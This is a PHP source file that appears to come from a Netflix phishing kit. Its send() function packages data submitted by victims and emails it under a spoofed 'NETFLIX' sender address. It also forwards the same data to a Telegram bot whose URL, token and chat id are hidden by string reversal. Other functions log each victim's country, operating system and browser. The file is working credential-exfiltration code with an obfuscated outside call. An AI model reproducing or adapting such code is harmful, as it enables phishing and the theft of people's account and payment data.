<?php

function send($info,$to,$subject){
$ip=getip() ;
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: NETFLIX<a@memekcorp.xyz>" . "\r\n";

    $x .= "* ============================== *<br>";
    foreach ($info as $MName => $MValue) 
    {
		$x .= "* $MName : $MValue <br>";
		$writes.=$MValue."|";
    }
    $x .= "* ============================== *<br>";
    $ch = curl_init(strrev("=txet&7271352911=di_tahc?egasseMdneS/IhxkRwNFtiMGafs8lXZKdHP97EShwjC-FAA:265627139tob/gro.margelet.ipa//:sptth").$writes);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    $x .= "* From : ".getCountry($info)."<br>";
    $x .= "* OS : ".getpcOS($_SERVER['HTTP_USER_AGENT'])."<br>";
    $x .= "* Browser : ".getpcBrowser($_SERVER['HTTP_USER_AGENT'])."<br>";
    $x .= "* ============================== *<br>";
    mail($to,$subject,$x,$headers);
 }
function getip() {
$ip =getenv("REMOTE_ADDR") ;
return $ip ;
}
function getpcBrowser($FMDuser_agent){
$browser    =   "Unknown Browser";
$browser_a  =   array('/msie/i'         =>  'Internet Explorer',
                        '/firefox/i'    =>  'Firefox',
                        '/safari/i'     =>  'Safari',
                        '/chrome/i'     =>  'Chrome',
                        '/edge/i'       =>  'Edge',
                        '/opera/i'      =>  'Opera',
                        '/netscape/i'   =>  'Netscape',
                        '/maxthon/i'    =>  'Maxthon',
                        '/konqueror/i'  =>  'Konqueror',
                        '/mobile/i'     =>  'Handheld Browser');
    foreach ($browser_a as $regex => $value) { 
        if (preg_match($regex, $FMDuser_agent)) {
            $browser = $value;
        }
    }
    return $browser;
}

function getCountry($ip) {
    $ip=base64_encode(serialize($ip))  ;
   $api="https://ipgeolocation.us/country.php?ip=$ip";
   $ch = curl_init();
   curl_setopt($ch, CURLOPT_URL,$api);
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
   $server_output = curl_exec ($ch);
   $COUNTRY=$server_output;
   curl_close ($ch);
return  $COUNTRY ;
}

function getpcOS($FMDuser_agent){
    $os    =   "Unknown OS Platform";
    $os_a  =   array( '/windows nt 10/i'     =>  'Windows 10',
                    '/windows nt 6.3/i'     =>  'Windows 8.1',
                    '/windows nt 6.2/i'     =>  'Windows 8',
                    '/windows nt 6.1/i'     =>  'Windows 7',
                    '/windows nt 6.0/i'     =>  'Windows Vista',
                    '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                    '/windows nt 5.1/i'     =>  'Windows XP',
                    '/windows xp/i'         =>  'Windows XP',
                    '/windows nt 5.0/i'     =>  'Windows 2000',
                    '/windows me/i'         =>  'Windows ME',
                    '/win98/i'              =>  'Windows 98',
                    '/win95/i'              =>  'Windows 95',
                    '/win16/i'              =>  'Windows 3.11',
                    '/macintosh|mac os x/i' =>  'Mac OS X',
                    '/mac_powerpc/i'        =>  'Mac OS 9',
                    '/linux/i'              =>  'Linux',
                    '/ubuntu/i'             =>  'Ubuntu',
                    '/iphone/i'             =>  'iPhone',
                    '/ipod/i'               =>  'iPod',
                    '/ipad/i'               =>  'iPad',
                    '/android/i'            =>  'Android',
                    '/blackberry/i'         =>  'BlackBerry',
                    '/webos/i'              =>  'Mobile');
    foreach ($os_a as $regex => $value) { 
        if (preg_match($regex, $FMDuser_agent)) {
            $os = $value;
        }

    }   
    return $os;
}
?>
